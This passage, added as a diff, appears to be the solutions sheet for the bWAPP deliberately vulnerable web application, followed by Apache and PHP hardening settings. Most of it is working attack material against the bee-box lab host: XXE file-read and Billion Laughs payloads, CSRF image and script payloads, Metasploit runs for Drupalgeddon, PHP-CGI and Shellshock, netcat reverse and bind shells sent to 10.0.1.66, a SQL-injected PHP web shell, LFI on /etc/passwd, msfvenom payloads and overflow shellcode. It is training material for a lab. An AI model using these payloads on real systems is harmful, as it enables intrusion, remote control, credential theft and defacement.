+]>
+<reset><login>bee</login><secret>&bWAPP;</secret></reset>
+
+<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE root [
+ <!ENTITY bWAPP SYSTEM "http://localhost:22">
+]>
+<reset><login>&bWAPP;</login><secret>blah</secret></reset>
+
+<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE root [
+ <!ENTITY bWAPP SYSTEM "http://localhost/bWAPP/robots.txt">
+]>
+<reset><login>&bWAPP;</login><secret>blah</secret></reset>
+
+
+# Denial-of�Service (DoS)
+
+# The Billion Laughs Denial-of�Service (DoS) attack consists of defining 10 entities, each defined as consisting of 10 of the previous entity, with the document consisting of a single instance of the largest entity, which expands to one billion copies of the first entity.
+# URL: http://en.wikipedia.org/wiki/Billion_laughs
+# URL: http://msdn.microsoft.com/en-us/magazine/ee335713.aspx
+
+<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE lolz [
+ <!ENTITY lol "lol">
+ <!ELEMENT login (#PCDATA)>
+ <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
+ <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
+ <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
+ <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
+ <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
+ <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
+ <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
+ <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
+ <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
+]>
+<reset><login>&lol9;</login><secret>blah</secret></reset>
+
+
+# Security level medium/high
+# The session variable 'login' is used instead of the XML field 'login', however XXE is still possible through the XML field 'secret'
+# BTW: libxml_disable_entity_loader(true) is not enabled because it doesn't work with older PHP versions (~ bee-box)
+
+<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE root [
+ <!ENTITY bWAPP SYSTEM "file:///[file]">
+]>
+<reset><login>bee</login><secret>&bWAPP;</secret></reset>
+
+
+# External Links
+
+URL: http://websec.io/2012/08/27/Preventing-XEE-in-PHP.html
+URL: https://www.idontplaydarts.com/2011/02/scanning-the-internal-network-using-simplexml/
+
+
+--------------------------------------
+A8 - Cross-Site Request Forgery (CSRF)
+--------------------------------------
+
+# External Links
+
+URL: https://www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF)
+URL: https://www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF)_Prevention_Cheat_Sheet
+
+
+CSRF (Change Password)
+----------------------
+
+URL: http://bee-box.local/bWAPP/csrf_1.php
+
+# Go to http://bee-box.local/bWAPP/htmli_stored.php, or another evil site, and enter...
+
+Make my day ;)<img src="http://bee-box.local/bWAPP/csrf_1.php?password_new=evil&password_conf=evil&action=change" height="0" width="0">
+
+# Visit http://bee-box.local/bWAPP/htmli_stored.php, or the evil site...
+# oops, your password has been changed to 'evil' ;)
+
+
+CSRF (Change Secret)
+--------------------
+
+URL: http://bee-box.local/bWAPP/csrf_3.php
+
+# Go to http://bee-box.local/bWAPP/htmli_stored.php, or another evil site, and enter...
+
+# GET request
+
+	We change secrets! ;p<img src="http://bee-box.local/bWAPP/csrf_3.php?secret=awesome&login=bee&action=change" height="0" width="0">
+
+# POST request
+
+	We change secrets! ;p
+	<script>
+	var xmlhttp;
+	// Code for IE7+, Firefox, Chrome, Opera, Safari
+	if (window.XMLHttpRequest)
+	{
+		xmlhttp=new XMLHttpRequest();
+	}
+	// Code for IE6, IE5
+	else
+	{ 
+		xmlhttp=new ActiveXObject("Microsoft.XMLHTTP");
+	}	
+	xmlhttp.open("POST","http://bee-box.local/bWAPP/csrf_3.php",true);
+	xmlhttp.setRequestHeader("Content-type","application/x-www-form-urlencoded");
+	xmlhttp.withCredentials = true;
+	xmlhttp.send("secret=awesome&login=bee&action=change");
+	</script>
+
+# Visit http://bee-box.local/bWAPP/htmli_stored.php, or the evil site...
+# oops, your secret has been changed to 'awesome!' ;)
+# Check your secret: http://bee-box.local/bWAPP/secret.php
+
+
+CSRF (Transfer Amount)
+----------------------
+
+URL: http://bee-box.local/bWAPP/csrf_2.php
+
+# Go to http://bee-box.local/bWAPP/htmli_stored.php, or another evil site, and enter...
+
+Make me rich ;)<img src="http://bee-box.local/bWAPP/csrf_2.php?account=666-66666-66&amount=1000&action=transfer" height="0" width="0">
+
+# Visit http://bee-box.local/bWAPP/htmli_stored.php, or the evil site, a couple of times...
+# Afterwards, check your account again: http://bee-box.local/bWAPP/csrf_2.php
+
+
+--------------------------------------
+A9 - Using Known Vulnerable Components
+--------------------------------------
+
+URL: Drupal SQL Injection (Drupageddon)
+
+Tool: Metasploit
+
+msfconsole
+
+use exploit/multi/http/drupal_drupageddon
+set RHOST bee-box.local
+set TARGETURI /drupal/
+set vhost bee-box.local
+exploit
+
+shell
+python -c 'import pty;pty.spawn("/bin/bash")'
+whoami
+echo Bugged! > /var/www/bWAPP/documents/bee_drupal.htm
+
+Defacement: http://bee-box.local/bWAPP/documents/bee_drupal.htm
+
+
+URL: Drupal Remote Code Execution (Drupalgeddon 2)
+
+Tool: Metasploit
+
+msfconsole
+
+use unix/webapp/drupal_drupalgeddon2
+set RHOST bee-box.local
+set TARGETURI /drupal/
+set vhost bee-box.local
+exploit
+
+# External Links
+
+URL: https://unit42.paloaltonetworks.com/unit42-exploit-wild-drupalgeddon2-analysis-cve-2018-7600/
+
+
+Heartbleed Vulnerability
+------------------------
+
+URL: http://bee-box.local/bWAPP/heartbleed.php
+
+# Detection with nmap
+
+nmap -sV -p 8443 --script=ssl-heartbleed bee-box.local
+
+
+# Detection and exploitation with heartbleed.py (included in the evil directory)
+
+python heartbleed.py bee-box.local
+
+
+PHP CGI Remote Code Execution
+-----------------------------
+
+URL: http://bee-box.local/bWAPP/php_cgi.php
+
+# The admin directory is using PHP in CGI mode
+# Vulnerable for CVE-2012-1823
+
+# Verify the server API and PHP version
+
+http://bee-box.local/bWAPP/admin/phpinfo.php
+
+# Source code disclosure
+
+http://bee-box.local/bWAPP/admin/?-s
+
+
+Tool: OWASP ZAP
+
+# Detection
+
+GET http://bee-box.local/bWAPP/admin/?-s HTTP/1.1
+Host: bee-box.local
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:26.0) Gecko/20100101 Firefox/26.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Cookie: PHPSESSID=57513f95f6d9d660774ecff66f47c65f; security_level=0
+Connection: keep-alive
+Content-length: 0
+
+
+POST http://bee-box.local/bWAPP/admin/?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input HTTP/1.1
+Host: bee-box.local
+Content-Type: application/x-www-form-urlencoded
+Accept: */*
+
+<?php echo(md5("detecting-CVE-2012-1823")) ?>
+
+
+# Exploitation
+
+POST http://bee-box.local/bWAPP/admin/?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input HTTP/1.1
+Host: bee-box.local
+Content-Type: application/x-www-form-urlencoded
+Accept: */*
+
+<?php system("echo 'Bugged!' > /var/www/bWAPP/documents/bee_cgi_1.htm"); ?>
+
+Defacement: http://bee-box.local/bWAPP/documents/bee_cgi_1.htm
+
+
+Tool: Metasploit
+
+msfconsole
+
+use exploit/multi/http/php_cgi_arg_injection
+set RHOST bee-box.local
+set TARGETURI /bWAPP/admin/
+exploit
+
+shell
+python -c 'import pty;pty.spawn("/bin/bash")'
+whoami
+echo "Bugged!" > /var/www/bWAPP/documents/bee_cgi_2.htm
+
+Defacement: http://bee-box.local/bWAPP/documents/bee_cgi_2.htm
+
+
+# External Links
+
+URL: http://eindbazen.net/2012/05/php-cgi-advisory-cve-2012-1823/
+URL: http://www.securityfocus.com/bid/53388
+
+
+phpMyAdmin error.php BBcode Tag XSS
+-----------------------------------
+
+http://bee-box.local/phpmyadmin/error.php?type=Bugged!&error=[a@http://www.attacker.local@_self]Click here[/a]
+
+
+Shellshock Vulnerability (CGI)
+------------------------------
+
+URL: http://bee-box.local/bWAPP/shellshock.php
+
+Tool: OWASP ZAP
+
+# Detection
+
+GET http://bee-box.local/bWAPP/cgi-bin/shellshock.sh HTTP/1.1
+Accept: () { :;}; echo "bWAPP:" $(/bin/sh -c "expr 1 + 1")
+Referer: () { :;}; echo "bWAPP:" $(/bin/sh -c "expr 1 + 2")
+User-Agent: () { :;}; echo "bWAPP:" $(/bin/sh -c "expr 1 + 3")
+
+
+# Exploitation
+
+nc -l -p 666
+
+GET http://bee-box.local/bWAPP/cgi-bin/shellshock.sh HTTP/1.1
+Referer: () { :;}; echo "bWAPP:" $(/bin/sh -c "nc 10.0.1.66 666 -e /bin/bash")
+
+
+Tool: Metasploit
+
+msfconsole
+
+use exploit/multi/http/apache_mod_cgi_bash_env_exec
+set RHOST bee-box.local
+set TARGETURI /bWAPP/cgi-bin/shellshock.sh
+set PAYLOAD linux/x86/meterpreter/reverse_tcp
+exploit
+
+shell
+python -c 'import pty;pty.spawn("/bin/bash")'
+whoami
+echo Bugged! > /var/www/bWAPP/documents/bee_cgi_3.htm
+
+Defacement: http://bee-box.local/bWAPP/documents/bee_cgi_3.htm
+
+
+# Exploitable through XSS
+
+URL: http://bee-box.local/bWAPP/xss_stored_1.php
+
+<script>
+var xmlhttp;
+// Code for IE7+, Firefox, Chrome, Opera, Safari
+if (window.XMLHttpRequest)
+{
+	xmlhttp=new XMLHttpRequest();
+}
+// Code for IE6, IE5
+else
+{ 
+	xmlhttp=new ActiveXObject("Microsoft.XMLHTTP");
+}	
+xmlhttp.open("GET","http://bee-box.local/bWAPP/cgi-bin/shellshock.sh",true);
+xmlhttp.setRequestHeader("Accept", "() { :;}; echo 'bWAPP:' $(/bin/sh -c 'nc 10.0.1.66 666 -e /bin/bash')");
+xmlhttp.send();
+</script>
+
+
+# BeEF parameters ('Commands' > 'Exploits'>
+
+Target		: http://bee-box.local/bWAPP/cgi-bin/shellshock.sh
+Bash Command	: /bin/sh -c 'nc 10.0.1.66 666 -e /bin/bash'
+
+
+SQLiteManager Local File Inclusion
+----------------------------------
+
+URL: http://bee-box.local/bWAPP/lfi_sqlitemanager.php
+
+Tool: OWASP ZAP
+
+GET http://bee-box.local/sqlite HTTP/1.1
+Cookie: SQLiteManager_currentTheme=../../../../../../../../../../../../../etc/passwd%00
+
+
+--------------------------------------
+A10 - Unvalidated Redirects & Forwards
+--------------------------------------
+
+Unvalidated Redirects & Forwards (1)
+------------------------------------
+
+URL: http://bee-box.local/bWAPP/unvalidated_redir_fwd_1.php
+
+http://bee-box.local/bWAPP/unvalidated_redir_fwd_1.php?url=http://www.bee-box.local
+
+# URL encoded (http://rishida.net/tools/conversion/)
+http://bee-box.local/bWAPP/unvalidated_redir_fwd_1.php?url=%68%74%74%70%3A%2F%2F%77%77%77%2E%69%74%73%65%63%67%61%6D%65%73%2E%63%6F%6D
+
+
+Unvalidated Redirects & Forwards (2)
+------------------------------------
+
+URL: http://bee-box.local/bWAPP/unvalidated_redir_fwd_2.php
+
+http://bee-box.local/bWAPP/unvalidated_redir_fwd_2.php?ReturnUrl=http://www.bee-box.local
+
+# URL encoded (http://rishida.net/tools/conversion/)
+http://bee-box.local/bWAPP/unvalidated_redir_fwd_2.php?ReturnUrl=%68%74%74%70%3A%2F%2F%77%77%77%2E%69%74%73%65%63%67%61%6D%65%73%2E%63%6F%6D
+
+
+-------------
+Other bugs...
+-------------
+
+ClickJacking
+------------
+
+URL: http://bee-box.local/bWAPP/clickjacking.php
+
+# Modify the host file on the victim!
+# 10.0.1.51	bee-box.local
+# 10.0.1.51	attacker.local
+
+# Go to http://bee-box.local/evil/clickjacking.htm
+
+
+HTTP Parameter Pollution
+------------------------
+
+URL: http://bee-box.local/bWAPP/hpp-1.php
+
+blah&movie=2
+
+
+HTTP Response Splitting
+-----------------------
+
+URL: http://bee-box.local/bWAPP/http_response_splitting.php
+
+http://bee-box.local/bWAPP/http_response_splitting.php?url=%0d%0aContent-Type: text/html%0d%0aHTTP/1.1 200 OK%0d%0aContent-Type: text/html%0d%0a%0d%0a<html><script>alert(document.cookie)</script></html><!--
+http://bee-box.local/bWAPP/http_response_splitting.php?url=%0d%0a%0d%0a<html><script>alert(document.cookie)</script></html><!--
+
+# Newer versions of PHP are not vulnerable!
+
+# External Links
+
+http://www.hackthissite.org/articles/read/915
+http://www.securiteam.com/securityreviews/5WP0E2KFGK.html
+
+
+HTTP Verb Tampering
+-------------------
+
+URL: http://bee-box.local/bWAPP/http_verb_tampering.php
+
+# POST > GET
+http://bee-box.local/bWAPP/http_verb_tampering.php?password_curr=bug&password_new=bug&password_conf=bug
+
+
+Unrestricted File Upload
+------------------------
+
+URL: http://bee-box.local/bWAPP/unrestricted_file_upload.php
+
+# Security level low
+# Upload a malicious file with the PHP extension
+
+# Security level medium
+# A black-list is used, the following extensions are blocked: asp, aspx, dll, exe, jsp, php
+# Black-lists are NOT SAFE!
+# Bypass the black-list restriction by uploading a file with the PHP3, PHP4, or PHP5 extension
+
+# Security level high
+# A white-list is used, only the following extensions are allowed: jpg, png
+
+
+Tool: Laudanum
+
+# Customize and upload the PHP files
+# Browse to the files and explore the functionalities...
+
+# php-reverse-shell.php
+
+nc -l -p 8888
+
+python -c 'import pty;pty.spawn("/bin/bash")'
+echo "Bugged!" > /var/www/bWAPP/documents/bee_ufu_1.htm
+
+Defacement: http://bee-box.local/bWAPP/documents/bee_ufu_1.htm
+
+
+Tool: Metasploit
+
+# Payload generation with msfvenom, base64 encoded, don't forget to edit the file: <?php ... ?>
+
+msfvenom -p php/meterpreter/reverse_tcp LHOST=10.0.1.66 LPORT=666 -e php/base64 -f raw > /root/Desktop/bee-shell.php
+
+# Payload generation with msfconsole
+
+msfconsole
+
+use payload/php/meterpreter/reverse_tcp
+set LHOST 10.0.1.66
+set LPORT 666
+generate -t raw -f /root/Desktop/bee-shell.php
+
+use exploit/multi/handler
+set PAYLOAD php/meterpreter/reverse_tcp
+set LHOST 10.0.1.66
+set LPORT 666
+exploit
+
+# Upload the bee-shell.php file
+# Browse to the file...
+
+http://bee-box.local/bWAPP/images/bee-shell.php
+
+shell
+python -c 'import pty;pty.spawn("/bin/bash")'
+whoami
+
+echo "Bugged!" > /var/www/bWAPP/documents/bee_ufu_2.htm
+
+Defacement: http://bee-box.local/bWAPP/documents/bee_ufu_2.htm
+
+
+# External Links
+
+URL: https://www.owasp.org/index.php/Unrestricted_File_Upload
+URL: http://oco.cc/
+
+
+--------------------
+Not classified (yet)
+--------------------
+
+a','EVIL'); ATTACH DATABASE '/var/www/bWAPP/images/evil.php' AS evil; CREATE TABLE evil.bee (angry text); INSERT INTO evil.bee (angry) VALUES ("<?php system($_GET['cmd']); ?>");--
+
+CREATE TABLE temptab (codetab text);
+INSERT INTO temptab VALUES ('<?php phpinfo()?>');
+
+python sqlite.py http://bee-box.local/sqlite/
+
+http://bee-box.local/sqlite/main.php?dbsel='";</script><script>alert(document.cookie)</script>
+(http://seclists.org/bugtraq/2012/Jan/34)
+
+msfpayload linux/x86/exec  CMD="cat /etc/passwd" R | msfencode -b "\x00\xff\x20" c
+$(python -c 'print "\x90" * 354 +  "\x8f\x92\x04\x08"  + "\x90" * 10 + "\xda\xc3\xd9\x74\x24\xf4\xb8\x57\x92\xdf\xce\x5a\x29\xc9\xb1\x0d\x31\x42\x1a\x03\x42\x1a\x83\xea\xfc\xe2\xa2\xf8\xd4\x96\xd5\xaf\x8c\x4e\xc8\x2c\xd8\x68\x7a\x9c\xa9\x1e\x7a\x8a\x62\xbd\x13\x24\xf4\xa2\xb1\x50\x16\x25\x35\xa1\x74\x44\x41\x81\x55\xe3\xdd\xa2\x86\x9b\x7c\x56\xaa\x2c\x1a\x98\x1b\x80\x6b\x79\x6e\xa6"')
+
+msfpayload linux/x86/exec  CMD="/bin/nc -lp 4444 -e /bin/sh" R | msfencode -b "\x00\xff\x20" c
+$(python -c 'print "\x90" * 354 +  "\x8f\x92\x04\x08"  + "\x90" * 10 + "\xda\xd3\xd9\x74\x24\xf4\x58\x33\xc9\xba\xc2\xdd\x87\xdb\xb1\x10\x83\xe8\xfc\x31\x50\x16\x03\x50\x16\xe2\x37\xb7\x8c\x83\x2e\x1a\xf5\x5b\x7d\xf8\x70\x7c\x15\xd1\xf1\xeb\xe5\x45\xd9\x89\x8c\xfb\xac\xad\x1c\xec\xb3\x31\xa0\xec\xe4\x53\xc9\x82\xd5\xfd\x6a\x7b\x07\x6e\x1c\x5b\x63\x5a\xe8\xaf\xab\x8f\x75\xf0\x84\xad\x1c\x9e\xf5\x42\xb6\x5e\x5d\xf6\xcf\xbe\xac\x78"')
+nc bee-box.local 4444
+
+msfpayload linux/x86/exec  CMD="/bin/nc -lp 4444 -e /bin/sh" R | msfencode -b "\x00\xff\x20" c
+python -c 'print "\x90" * 354 +  "\xa7\x8f\x04\x08"  + "\x90" * 10 + "\xda\xd3\xd9\x74\x24\xf4\x58\x33\xc9\xba\xc2\xdd\x87\xdb\xb1\x10\x83\xe8\xfc\x31\x50\x16\x03\x50\x16\xe2\x37\xb7\x8c\x83\x2e\x1a\xf5\x5b\x7d\xf8\x70\x7c\x15\xd1\xf1\xeb\xe5\x45\xd9\x89\x8c\xfb\xac\xad\x1c\xec\xb3\x31\xa0\xec\xe4\x53\xc9\x82\xd5\xfd\x6a\x7b\x07\x6e\x1c\x5b\x63\x5a\xe8\xaf\xab\x8f\x75\xf0\x84\xad\x1c\x9e\xf5\x42\xb6\x5e\x5d\xf6\xcf\xbe\xac\x78"' | nc bee-box.local 666
+nc bee-box.local 4444
+
+User-Agent: blah',(select password from heroes where login='neo'))#
+
+login=bee&password=bug&captcha_user=&form=submit > login=bee&password=bug&form=submit (don't visit the page!)
+
+# Session fixation attack
+
+# It could be vulnerable if you comment session_regenerate_id(true) in login.php
+# Simply XSS the victim to fix the session
+
+<script>document.cookie="PHPSESSID=66666666666666666666666666666666"</script>
+<script>document.cookie="PHPSESSID=66666666666666666666666666666666;;path=/"</script>
+
+
+---------------------------
+Overview of the defacements
+---------------------------
+
+http://bee-box.local/bWAPP/htmli_stored.php,<meta http-equiv="refresh" content="0; url=http://www.mmeit.be/">
+http://bee-box.local/bWAPP/xss_stored_1.php,<script>document.location="http://www.mmeit.be/en/";</script>
+http://bee-box.local/bWAPP/documents/bee_cmdi.htm
+http://bee-box.local/bWAPP/documents/bee_phpi.htm
+http://bee-box.local/bWAPP/documents/bee_ssii.htm
+http://bee-box.local/bWAPP/documents/bee_sqli.htm
+http://bee-box.local/bWAPP/documents/bee_samba.htm
+http://bee-box.local/bWAPP/documents/bee_ftp.htm
+http://bee-box.local/bWAPP/documents/bee_dav.htm
+http://bee-box.local/bWAPP/documents/bee_lfi.htm
+http://bee-box.local/bWAPP/documents/bee_rfi.htm
+http://bee-box.local/bWAPP/documents/bee_ufu_1.htm
+http://bee-box.local/bWAPP/documents/bee_ufu_2.htm
+http://bee-box.local/bWAPP/documents/bee_cgi_1.htm
+http://bee-box.local/bWAPP/documents/bee_cgi_2.htm
+http://bee-box.local/bWAPP/documents/bee_cgi_3.htm
+http://bee-box.local/bWAPP/documents/bee_drupal.htm
+
+
+--------------------
+Web Server Hardening
+--------------------
+
+# Apache Security
+
+# Restarts the Apache server
+
+/etc/init.d/apache2 restart
+
+
+# Lists the loaded modules
+
+apache2ctl -M
+
+
+# Enables a specific module
+
+a2enmod ssl
+a2enmod rewrite
+a2enmod php5
+a2enmod include
+a2enmod headers
+a2enmod dav
+a2enmod dav_fs
+a2enmod action
+
+
+# Disables a specific module
+
+a2dismod ssl
+
+
+# Creates a certificate
+
+cd /etc/ssl/certs
+
+openssl genrsa [-des3] -out bee-box.local.key 2048
+openssl req -new -key bee-box.local.key -out bee-box.local.csr
+openssl x509 -req -days 365 -in bee-box.local.csr -signkey bee-box.local.key -out bee-box.local.crt
+
+# Create a PEM file (optional)
+
+# openssl rsa -in bee-box.local.key -out bee-box.local.key
+# cat bee-box.local.crt bee-box.local.key > bee-box.local.pem
+
+# Edit the 000-default file
+
+SSLEngine on
+SSLCertificateFile /etc/ssl/certs/bee-box.local.crt
+SSLCertificateChainFile /etc/ssl/certs/bee-box.local.crt
+SSLCertificateKeyFile /etc/ssl/certs/bee-box.local.key
+# SSLCertificateFile /etc/ssl/certs/bee-box.local.pem
+
+---
+
+# httpd.conf fine-tuning
+
+# Sets the web root directory
+
+
+DocumentRoot /var/www/
+
+
+
+
+# Sets the email address that the server includes in error messages sent to the client
+
+
+ServerAdmin bwapp@bee-box.local
+
+
+
+
+# Sets the default file to read when no file is specified
+
+
+DirectoryIndex index.php index.htm index.html
+
+
+
+
+# Sets a custom 404 document
+
+
+ErrorDocument 404 /bWAPP/portal.php
+
+
+
+# Hides web server version and OS identity
+
+
+ServerTokens Prod
+
+ServerSignature Off
+
+
+
+
+# Allows Apache to run with its own non-privileged account
+
+# Suppose both Apache, and your mail server were running as nobody: an attack through Apache may allow the mail server to also be compromised, and vise versa!!!
+
+
+User www-data
+
+Group www-data
+
+
+
+
+# Sets advanced logging to a custom directory
+
+
+ErrorLog /var/log/apache2/bWAPP/error.log
+
+CustomLog /var/log/apache2/bWAPP/access.log combined
+LogLevel warn
+
+# Possible values include: debug, info, notice, warn, error, crit, alert, emerg.
+
+
+
+
+# Disables the HTTP TRACE method
+
+TraceEnable Off
+
+
+
+
+# Basic DoS mitigations
+
+
+Timeout 10
+
+KeepAlive On
+
+KeepAliveTimeout 15
+
+# The httpready accept filter buffers entire HTTP requests at the kernel level. Once an entire request is received, the kernel then sends it to the server
+
+AcceptFilter http data
+
+AcceptFilter https data
+
+LimitRequestBody 102400
+
+LimitXMLRequestBody 10485760
+
+LimitRequestFields 32
+
+LimitRequestFieldSize 8000
+
+LimitRequestLine 4000
+
+
+
+
+# Sets the Anti-ClickJacking HTTP header
+
+
+Header append X-Frame-Options DENY
+
+
+
+
+# Prohibits Apache to access any files outside of its web root
+
+
+<Directory />
+
+ Order deny,allow
+
+ Deny from all
+
+ Options none
+
+ AllowOverride none
+
+</Directory>
+
+
+
+<Directory /var/www>
+
+ Order allow,deny
+
+ Allow from all
+
+ # Disables directory browsing, server side includes, CGI execution, multiviews, (and prohibits Apache to follow symbolic links)
+
+ Options -Indexes -Includes -ExecCGI -MultiViews FollowSymLinks
+
+ # The settings can be overwritten with an .htaccess file
+
+ AllowOverride all
+
+ RewriteEngine On
+
+ # Disables insecure HTTP methods, disables WebDAV
+
+ RewriteCond %{REQUEST_METHOD} !^(GET|POST|HEAD)
+
+ RewriteRule .* - [R=405,L]
+
+ # Forces HTTPS
+ RewriteCond %{HTTPS} Off
+ RewriteRule ^/?(.*) https://%{SERVER_NAME}/$1 [R,L]
+</Directory>
+
+
+
+
+# Shows server-status information, restricted to the localhost
+
+
+ExtendedStatus On
+
+<Location /server-status>
+ SetHandler server-status
+
+ Order deny,allow
+
+ Deny from all
+
+ Allow from 127.0.0.1
+
+</Location>
+
+
+
+
+# Configures Basic Authentication for the admin directory
+
+
+# Don't forget to create the user database!
+
+# htpasswd -c /etc/bees bee
+
+<Location /bWAPP/admin>
+
+ AuthUserFile /etc/bees
+
+ AuthName "Hi little bees! - Restricted Area"
+
+ AuthGroupFile /dev/null
+
+ AuthType Basic
+
+ Require valid-user
+
+</Location>
+
+
+
+
+# Denies access to the password directory
+
+
+<Directory /var/www/bWAPP/passwords>
+
+ Order deny,allow
+
+ Deny from all
+
+</Directory>
+
+
+
+
+# Allows WebDAV, not secure!!!
+
+
+Alias /webdav /var/www/bWAPP/documents
+
+<Location /webdav>
+
+ DAV On
+
+</Location>
+
+---
+
+# PHP Security
+
+# Lists the set of compiled-in PHP modules
+
+php -m
+
+---
+
+# php.ini fine-tuning
+
+# Location: /etc/php5/apache2/
+
+# Restricts PHP information leakage
+
+expose_php = Off
+
+
+# Prohibits PHP error message exposure to all site visitors
+
+display_errors = Off
+
+
+# Logs all PHP errors
+
+log_errors = On
+error_log = /var/log/apache2/bWAPP/php_scripts_error.log
+
+
+# Restricts the uploaded file size
+
+file_uploads = on
+upload_max_filesize = 1M
+
+
+# Turns off remote code execution
+
+allow_url_fopen = Off
+allow_url_include = Off
+
+
+# Turns off magic quotes
+
+magic_quotes_gpc = Off
+
+
+# Sets resource control (DoS mitigations)
+# Set in seconds
+
+max_execution_time = 30
+max_input_time = 30
+memory_limit = 16M
+
+
+# Disables dangerous PHP functions
+
+disable_functions = exec, passthru, shell_exec, system,proc_open, popen,curl_exec, curl_multi_exec, parse_ini_file, show_source, eval, base64_decode
+
+
+# Limits PHP access to the file system
+
+open_basedir = "/var/www/"
